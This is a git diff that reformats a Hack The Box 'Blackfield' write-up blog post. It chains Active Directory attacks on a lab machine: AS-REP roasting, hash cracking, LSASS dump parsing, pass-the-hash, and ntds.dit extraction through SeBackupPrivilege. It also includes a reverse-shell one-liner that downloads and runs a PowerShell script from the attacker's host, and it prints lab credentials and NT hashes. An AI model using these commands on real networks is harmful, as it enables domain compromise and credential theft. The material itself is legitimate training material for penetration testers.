@@ -1,1 +1,215 @@
-<html><head><meta charset="utf-8"></head><body><figure class="image"><img style="aspect-ratio:1266/148;" src="../img/posts/2024-09-29-Blackfield(HTB)/01-eec12ccd17.png" width="1266" height="148"></figure><p>&nbsp;</p><p>enum4linux has nothing interesting</p><p><code>enum4linux-ng 10.10.10.192 -a</code></p><p><code>OS: Windows 10, Windows Server 2019, Windows Server 2016</code><br><code>OS version: '10.0'</code><br><code>OS release: '1809'</code><br><code>OS build: '17763'</code><br>&nbsp;</p><p>&nbsp;</p><p>Valid users found</p><p><code>kerbrute userenum -d blackfield.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt &nbsp;--dc 10.10.10.192</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1129/328;" src="../img/posts/2024-09-29-Blackfield(HTB)/02-7a34d505d4.png" width="1129" height="328"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Getting kerberos hashes for users with no pre auth set</p><p><code>impacket-GetNPUsers BLACKFIELD.LOCAL/ -dc-ip 10.10.10.192 -no-pass -usersfile users.txt</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:624/296;" src="../img/posts/2024-09-29-Blackfield(HTB)/03-0af0550e58.png" width="624" height="296"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Cracking the hash with hashcat</p><p><code>hashcat hash.txt -m 18200 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:986/510;" src="../img/posts/2024-09-29-Blackfield(HTB)/04-d122385c7b.png" width="986" height="510"></figure><p>&nbsp;</p><p>Support:#00^BlackKnight</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:912/269;" src="../img/posts/2024-09-29-Blackfield(HTB)/05-1d013d0c19.png" width="912" height="269"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as svc_backup</u></strong></span></p><p>&nbsp;</p><p>With these creds we cannot remote into the machine just yet. We can use rpc client and dump the users though.</p><p>User list is too long to post here and all users are "BLACKFIELD&lt;random str of numbers&gt;</p><p>&nbsp;</p><p>Groups</p><p><code>Enterprise Read-only Domain Controllers</code><br><code>Domain Admins</code><br><code>Domain Users</code><br><code>Domain Guests</code><br><code>Domain Computers</code><br><code>Domain Controllers</code><br><code>Schema Admins</code><br><code>Enterprise Admins</code><br><code>Group Policy Creator Owners</code><br><code>Read-only Domain Controllers</code><br><code>Cloneable Domain Controllers</code><br><code>Protected Users</code><br><code>Key Admins</code><br><code>Enterprise Key Admins</code><br><code>DnsUpdateProxy</code></p><p>&nbsp;</p><p>Pass pol if we decide to password spray</p><p><code>Domain password information:</code><br><code>&nbsp;Password history length: 24</code><br><code>&nbsp;Minimum password length: 7</code><br><code>&nbsp;Maximum password age: 41 days 23 hours 53 minutes</code><br><code>&nbsp;Password properties:</code><br><code>&nbsp;- DOMAIN_PASSWORD_COMPLEX: true</code><br><code>&nbsp;- DOMAIN_PASSWORD_NO_ANON_CHANGE: false</code><br><code>&nbsp;- DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false</code><br><code>&nbsp;- DOMAIN_PASSWORD_LOCKOUT_ADMINS: false</code><br><code>&nbsp;- DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false</code><br><code>&nbsp;- DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false</code><br><code>Domain lockout information:</code><br><code>&nbsp;Lockout observation window: 30 minutes</code><br><code>&nbsp;Lockout duration: 30 minutes</code><br><code>&nbsp;Lockout threshold: None</code><br><code>Domain logoff information:</code><br><code>&nbsp;Force logoff time: not set</code><br>&nbsp;</p><p>&nbsp;</p><p>The profiles smb share gives us a bunch of new usernames that didnt show up in rpcclient. But they are all invalid.</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Bloodhound</u></strong></span></p><p>&nbsp;</p><p>Using the creds we can download bloodhound data with bloodhound-python.</p><p><code>bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192</code><br>&nbsp;</p><p>&nbsp;</p><p>We can force change password for the audit2020 user</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:852/934;" src="../img/posts/2024-09-29-Blackfield(HTB)/06-3d31c6cbcf.png" width="852" height="934"></figure><p>&nbsp;</p><p>Change password</p><p><code>net rpc password "audit2020" "newP@ssword2022" -U "BLACKFIELD.LOCAL"/"support"%"#00^BlackKnight" -S "dc01.BLACKFIELD.LOCAL"</code></p><p>&nbsp;</p><p>We still cant remote in but the change did work.</p><figure class="image"><img style="aspect-ratio:1257/99;" src="../img/posts/2024-09-29-Blackfield(HTB)/07-75aa582045.png" width="1257" height="99"></figure><p>&nbsp;</p><p>We have access to a new share</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1062/285;" src="../img/posts/2024-09-29-Blackfield(HTB)/08-32af0e8e06.png" width="1062" height="285"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>This audit share seems to be a previous pentest. It contains tools and logs and zipped folders. The first log file that gave this away was the “domain_admins.txt” file showing the username administrator and with the password “ipwnedyourcompany”.</p><p>&nbsp;</p><p>Looking through more files i find an lssas.zip file. Unzipping it we have an lssas dmp file. We can extract the contents with pypykatz</p><p>&nbsp;</p><p><code>pypykatz lsa minidump lsass.DMP</code></p><p>&nbsp;</p><p>Username: svc_backup<br>NT: 9658d1d1dcd9250115e2205d9f48400d<br>&nbsp;</p><p>&nbsp;</p><p>We can now pass the hash and remote in and get the user flag</p><p><code>evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:717/506;" src="../img/posts/2024-09-29-Blackfield(HTB)/09-bfe4a1c173.png" width="717" height="506"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as Administrator</u></strong></span></p><p>&nbsp;</p><p>We are svc_backup and have SeBackup enabled which we can use to access files we normally wouldnt be able to access.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:596/272;" src="../img/posts/2024-09-29-Blackfield(HTB)/10-a6f713e351.png" width="596" height="272"></figure><p>&nbsp;</p><p>I initially grabbed the sam/system file and dumped those hashes but they ended up being incorrect and I couldnt remote in as admin. I was stuck for a while at this point as I couldnt copy the ntds.dit file right away.</p><p>&nbsp;</p><p>I found this article explaining the privilege and explaining how to copy the file.</p><p><code>https://notes.morph3.blog/windows/privilege-escalation/sebackupprivilege</code></p><p>&nbsp;</p><p>We first needed to download these dll's for sebackupprivilege to work</p><p><code>https://github.com/giuliano108/SeBackupPrivilege</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:827/188;" src="../img/posts/2024-09-29-Blackfield(HTB)/11-2720f98766.png" width="827" height="188"></figure><p>&nbsp;</p><p>Once imported we can use the privilege but we cannot copy the ntds.dit file yet because its always “in use” by windows/AD so we cannot copy it while the machine is running. The guide shows us how to create a copy of the C drive allowing us to copy it. The next challenge was using diskshadow as we didnt have an interactive shell.</p><p>&nbsp;</p><p>Upgrading to interactive shell with ConPtyShell</p><p><a href="https://github.com/antonioCoco/ConPtyShell"><code>https://github.com/antonioCoco/ConPtyShell</code></a></p><p>&nbsp;</p><p>On kali machine</p><p><code>stty raw -echo; (stty size; cat) | nc -lvnp 3001</code><br>&nbsp;</p><p>Target machine</p><p><code>IEX(IWR http://10.10.14.8:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 3001</code></p><p>&nbsp;</p><p>&nbsp;</p><p>We get a fully interactive shell where diskshadow will work</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:888/337;" src="../img/posts/2024-09-29-Blackfield(HTB)/12-afd6de11bf.png" width="888" height="337"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Creating the clone of C:</p><p><code>set context persistent nowriters</code><br><code>add volume C: alias morph3</code><br><code>create</code><br><code>expose %morph3% G:</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:953/559;" src="../img/posts/2024-09-29-Blackfield(HTB)/13-53ffb6c069.png" width="953" height="559"></figure><p>&nbsp;</p><p>We can see it works as we cd to G:</p><p>&nbsp;</p><p>&nbsp;</p><p>Using our backup privilege to copy ntds.dit from the G drive</p><p><code>Copy-FileSeBackupPrivilege G:\windows\NTDS\ntds.dit c:\windows\temp\ntds.dit</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:999/61;" src="../img/posts/2024-09-29-Blackfield(HTB)/14-2bf1bc5711.png" width="999" height="61"></figure><p>&nbsp;</p><p>Confirming it worked and downloading it to our local machine</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:743/445;" src="../img/posts/2024-09-29-Blackfield(HTB)/15-958794ff30.png" width="743" height="445"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Dumping ntds.dit hashes(we were able to download the system file with reg save HKLM\System)</p><p><code>impacket-secretsdump -system ./SYSTEM -ntds ./ntds.dit LOCAL</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1027/502;" src="../img/posts/2024-09-29-Blackfield(HTB)/16-2b5e3d5972.png" width="1027" height="502"></figure><p>&nbsp;</p><p><code>evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:670/284;" src="../img/posts/2024-09-29-Blackfield(HTB)/17-46cce3303d.png" width="670" height="284"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:693/635;" src="../img/posts/2024-09-29-Blackfield(HTB)/18-167f8546c3.png" width="693" height="635"></figure><p><br>&nbsp;</p></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Blackfield | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-09-29-Blackfield(HTB)/01-eec12ccd17.png" alt="HTB: Blackfield cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Blackfield</h1>
+                <div class="post-meta">September 29, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <img alt="Screenshot 1" height="148" src="../img/posts/2024-09-29-Blackfield(HTB)/01-eec12ccd17.png" style="aspect-ratio:1266/148;" width="1266"/>
+
+        <p>enum4linux has nothing interesting</p>
+
+        <pre class="terminal"><code>enum4linux-ng 10.10.10.192 -a</code></pre>
+
+        <p><code>OS: Windows 10, Windows Server 2019, Windows Server 2016</code><br/><code>OS version: '10.0'</code><br/><code>OS release: '1809'</code><br/><code>OS build: '17763'</code><br/> </p>
+
+        <p>Valid users found</p>
+
+        <pre class="terminal"><code>kerbrute userenum -d blackfield.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  --dc 10.10.10.192</code></pre>
+
+        <img alt="Screenshot 2" height="328" src="../img/posts/2024-09-29-Blackfield(HTB)/02-7a34d505d4.png" style="aspect-ratio:1129/328;" width="1129"/>
+
+        <p>Getting kerberos hashes for users with no pre auth set</p>
+
+        <pre class="terminal"><code>impacket-GetNPUsers BLACKFIELD.LOCAL/ -dc-ip 10.10.10.192 -no-pass -usersfile users.txt</code></pre>
+
+        <img alt="Screenshot 3" height="296" src="../img/posts/2024-09-29-Blackfield(HTB)/03-0af0550e58.png" style="aspect-ratio:624/296;" width="624"/>
+
+        <p>Cracking the hash with hashcat</p>
+
+        <pre class="terminal"><code>hashcat hash.txt -m 18200 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+
+        <img alt="Screenshot 4" height="510" src="../img/posts/2024-09-29-Blackfield(HTB)/04-d122385c7b.png" style="aspect-ratio:986/510;" width="986"/>
+
+        <p>Support:#00^BlackKnight</p>
+
+        <img alt="Screenshot 5" height="269" src="../img/posts/2024-09-29-Blackfield(HTB)/05-1d013d0c19.png" style="aspect-ratio:912/269;" width="912"/>
+
+        <h1 style="color:red;">Shell as svc_backup</h1>
+
+        <p>With these creds we cannot remote into the machine just yet. We can use rpc client and dump the users though.</p>
+
+        <p>User list is too long to post here and all users are "BLACKFIELD&lt;random str of numbers&gt;</p>
+
+        <p>Groups</p>
+
+        <p><code>Enterprise Read-only Domain Controllers</code><br/><code>Domain Admins</code><br/><code>Domain Users</code><br/><code>Domain Guests</code><br/><code>Domain Computers</code><br/><code>Domain Controllers</code><br/><code>Schema Admins</code><br/><code>Enterprise Admins</code><br/><code>Group Policy Creator Owners</code><br/><code>Read-only Domain Controllers</code><br/><code>Cloneable Domain Controllers</code><br/><code>Protected Users</code><br/><code>Key Admins</code><br/><code>Enterprise Key Admins</code><br/><code>DnsUpdateProxy</code></p>
+
+        <p>Pass pol if we decide to password spray</p>
+
+        <p><code>Domain password information:</code><br/><code> Password history length: 24</code><br/><code> Minimum password length: 7</code><br/><code> Maximum password age: 41 days 23 hours 53 minutes</code><br/><code> Password properties:</code><br/><code> - DOMAIN_PASSWORD_COMPLEX: true</code><br/><code> - DOMAIN_PASSWORD_NO_ANON_CHANGE: false</code><br/><code> - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false</code><br/><code> - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false</code><br/><code> - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false</code><br/><code> - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false</code><br/><code>Domain lockout information:</code><br/><code> Lockout observation window: 30 minutes</code><br/><code> Lockout duration: 30 minutes</code><br/><code> Lockout threshold: None</code><br/><code>Domain logoff information:</code><br/><code> Force logoff time: not set</code><br/> </p>
+
+        <p>The profiles smb share gives us a bunch of new usernames that didnt show up in rpcclient. But they are all invalid.</p>
+
+        <h1 style="color:red;">Bloodhound</h1>
+
+        <p>Using the creds we can download bloodhound data with bloodhound-python.</p>
+
+        <pre class="terminal"><code>bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192</code></pre>
+
+        <p>We can force change password for the audit2020 user</p>
+
+        <img alt="Screenshot 6" height="934" src="../img/posts/2024-09-29-Blackfield(HTB)/06-3d31c6cbcf.png" style="aspect-ratio:852/934;" width="852"/>
+
+        <p>Change password</p>
+
+        <pre class="terminal"><code>net rpc password "audit2020" "newP@ssword2022" -U "BLACKFIELD.LOCAL"/"support"%"#00^BlackKnight" -S "dc01.BLACKFIELD.LOCAL"</code></pre>
+
+        <p>We still cant remote in but the change did work.</p>
+
+        <img alt="Screenshot 7" height="99" src="../img/posts/2024-09-29-Blackfield(HTB)/07-75aa582045.png" style="aspect-ratio:1257/99;" width="1257"/>
+
+        <p>We have access to a new share</p>
+
+        <img alt="Screenshot 8" height="285" src="../img/posts/2024-09-29-Blackfield(HTB)/08-32af0e8e06.png" style="aspect-ratio:1062/285;" width="1062"/>
+
+        <p>This audit share seems to be a previous pentest. It contains tools and logs and zipped folders. The first log file that gave this away was the “domain_admins.txt” file showing the username administrator and with the password “ipwnedyourcompany”.</p>
+
+        <p>Looking through more files i find an lssas.zip file. Unzipping it we have an lssas dmp file. We can extract the contents with pypykatz</p>
+
+        <pre class="terminal"><code>pypykatz lsa minidump lsass.DMP</code></pre>
+
+        <p>Username: svc_backup<br/>NT: 9658d1d1dcd9250115e2205d9f48400d<br/> </p>
+
+        <p>We can now pass the hash and remote in and get the user flag</p>
+
+        <pre class="terminal"><code>evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</code></pre>
+
+        <img alt="Screenshot 9" height="506" src="../img/posts/2024-09-29-Blackfield(HTB)/09-bfe4a1c173.png" style="aspect-ratio:717/506;" width="717"/>
+
+        <h1 style="color:red;">Shell as Administrator</h1>
+
+        <p>We are svc_backup and have SeBackup enabled which we can use to access files we normally wouldnt be able to access.</p>
+
+        <img alt="Screenshot 10" height="272" src="../img/posts/2024-09-29-Blackfield(HTB)/10-a6f713e351.png" style="aspect-ratio:596/272;" width="596"/>
+
+        <p>I initially grabbed the sam/system file and dumped those hashes but they ended up being incorrect and I couldnt remote in as admin. I was stuck for a while at this point as I couldnt copy the ntds.dit file right away.</p>
+
+        <p>I found this article explaining the privilege and explaining how to copy the file.</p>
+
+        <pre class="terminal"><code>https://notes.morph3.blog/windows/privilege-escalation/sebackupprivilege</code></pre>
+
+        <p>We first needed to download these dll's for sebackupprivilege to work</p>
+
+        <pre class="terminal"><code>https://github.com/giuliano108/SeBackupPrivilege</code></pre>
+
+        <img alt="Screenshot 11" height="188" src="../img/posts/2024-09-29-Blackfield(HTB)/11-2720f98766.png" style="aspect-ratio:827/188;" width="827"/>
+
+        <p>Once imported we can use the privilege but we cannot copy the ntds.dit file yet because its always “in use” by windows/AD so we cannot copy it while the machine is running. The guide shows us how to create a copy of the C drive allowing us to copy it. The next challenge was using diskshadow as we didnt have an interactive shell.</p>
+
+        <p>Upgrading to interactive shell with ConPtyShell</p>
+
+        <p><a href="https://github.com/antonioCoco/ConPtyShell"><code>https://github.com/antonioCoco/ConPtyShell</code></a></p>
+
+        <p>On kali machine</p>
+
+        <pre class="terminal"><code>stty raw -echo; (stty size; cat) | nc -lvnp 3001</code></pre>
+
+        <p>Target machine</p>
+
+        <pre class="terminal"><code>IEX(IWR http://10.10.14.8:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 3001</code></pre>
+
+        <p>We get a fully interactive shell where diskshadow will work</p>
+
+        <img alt="Screenshot 12" height="337" src="../img/posts/2024-09-29-Blackfield(HTB)/12-afd6de11bf.png" style="aspect-ratio:888/337;" width="888"/>
+
+        <p>Creating the clone of C:</p>
+
+        <p><code>set context persistent nowriters</code><br/><code>add volume C: alias morph3</code><br/><code>create</code><br/><code>expose %morph3% G:</code><br/> </p>
+
+        <img alt="Screenshot 13" height="559" src="../img/posts/2024-09-29-Blackfield(HTB)/13-53ffb6c069.png" style="aspect-ratio:953/559;" width="953"/>
+
+        <p>We can see it works as we cd to G:</p>
+
+        <p>Using our backup privilege to copy ntds.dit from the G drive</p>
+
+        <pre class="terminal"><code>Copy-FileSeBackupPrivilege G:\windows\NTDS\ntds.dit c:\windows\temp\ntds.dit</code></pre>
+
+        <img alt="Screenshot 14" height="61" src="../img/posts/2024-09-29-Blackfield(HTB)/14-2bf1bc5711.png" style="aspect-ratio:999/61;" width="999"/>
+
+        <p>Confirming it worked and downloading it to our local machine</p>
+
+        <img alt="Screenshot 15" height="445" src="../img/posts/2024-09-29-Blackfield(HTB)/15-958794ff30.png" style="aspect-ratio:743/445;" width="743"/>
+
+        <p>Dumping ntds.dit hashes(we were able to download the system file with reg save HKLM\System)</p>
+
+        <pre class="terminal"><code>impacket-secretsdump -system ./SYSTEM -ntds ./ntds.dit LOCAL</code></pre>
+
+        <img alt="Screenshot 16" height="502" src="../img/posts/2024-09-29-Blackfield(HTB)/16-2b5e3d5972.png" style="aspect-ratio:1027/502;" width="1027"/>
+
+        <pre class="terminal"><code>evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee</code></pre>
+
+        <img alt="Screenshot 17" height="284" src="../img/posts/2024-09-29-Blackfield(HTB)/17-46cce3303d.png" style="aspect-ratio:670/284;" width="670"/>
+
+        <img alt="Screenshot 18" height="635" src="../img/posts/2024-09-29-Blackfield(HTB)/18-167f8546c3.png" style="aspect-ratio:693/635;" width="693"/>
+    </article>
+
+</body>
+</html>
